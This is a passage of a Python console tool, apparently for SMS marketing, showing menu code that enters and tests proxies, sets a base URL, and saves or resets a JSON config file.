            proxies = []
            while True:
                p = input("  [Proxy] ").strip()
                if not p:
                    break
                proxies.append(p)
            
            if proxies:
                # Test each proxy
                print(f"\n  🔄 Testing {len(proxies)} proxies...")
                working = []
                for i, p in enumerate(proxies, 1):
                    print(f"  [{i}/{len(proxies)}] {p[:30]}...", end="")
                    test = test_proxy_connection(p)
                    if test:
                        print(f" ✅ ({test})")
                        working.append(p)
                    else:
                        print(f" ❌")
                
                print(f"  📊 {len(working)}/{len(proxies)} proxies working")
                self.tool_instance.proxy = working if working else None
                print(f"  ✅ Active proxies: {len(working)}")
            else:
                print("  ⚠️  No proxies entered")
        
        elif choice == "3":
            self.tool_instance.proxy = None
            self.tool_instance.session.proxies = {}
            print("  ✅ Proxy disabled")
        
        input("\n  ↩ Press Enter to continue...")
    
    def set_base_url(self):
        new_url = input(f"    🔧 Current: {self.tool_instance.base_url}\n    ➤ New URL: ").strip()
        if new_url:
            self.tool_instance.base_url = new_url.strip('/')
            self.__save_config({"base_url": new_url})
            print(f"    ✅ URL Updated: {new_url}")
            input("    [Press Enter to continue] ")
    
    def reset_config(self):
        if input("    ❌ Reset ALL config? (y/n): ").strip().lower() == 'y':
            import os
            try:
                os.remove('config.json')
            except FileNotFoundError:
                pass
            print("    ✅ Config reset!")
            self.user_settings.clear()
            # Preserve current proxy
            current_proxy = self.tool_instance.proxy
            self.tool_instance = IGProTool(api_key="MIP7780XZ9Q", proxy=current_proxy)
        else:
            print("    ⏪ Cancelled.")

    def __save_config(self, key_data):
        if isinstance(key_data, dict):
            self.user_settings.update(key_data)
        with open('config.json', 'w') as f:
            dump = {
                "api_key": self.tool_instance.api_key,
                "settings": self.user_settings,
                "created": str(time.time()),
                "user": "operator"
            }
            json.dump(dump, f, indent=2)
            print(f"    ✅ Config saved")


# ══════════════════════════════════════════════════════════════
#                    PROXY TEST UTILITY
# ══════════════════════════════════════════════════════════════

def test_proxy_connection(proxy_url):
    """Improved Proxy Test with multiple fallback services"""
    test_urls = [
        "https://api.ipify.org?format=json",
        "https://ipinfo.io/json",
        "http://httpbin.org/ip",
        "https://api.myip.com"
    ]
    
    print("    🔄 Testing proxy...", end=" ")
    
    for url in test_urls:
        try:
            test_session = requests.Session()
            test_session.proxies = {"http": proxy_url, "https": proxy_url}
            response = test_session.get(url, timeout=12)
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    ip = data.get("ip") or data.get("origin") or "Detected"
                    print(f"✅ SUCCESS | IP: {ip}")
                    return ip
                except:
                    if "ip" in response.text.lower():
                        print("✅ SUCCESS (IP detected)")
                        return "Detected"
        except Exception as e:
            continue  # Try next URL
    
    print("❌ FAILED")
    return None


# ══════════════════════════════════════════════════════════════
#                    MAIN ENTRY POINT
# ══════════════════════════════════════════════════════════════
if __name__ == '__main__':
    ui = SMSMarketingTool(api_key="MIP7780XZ9Q")
    ui.main_menu()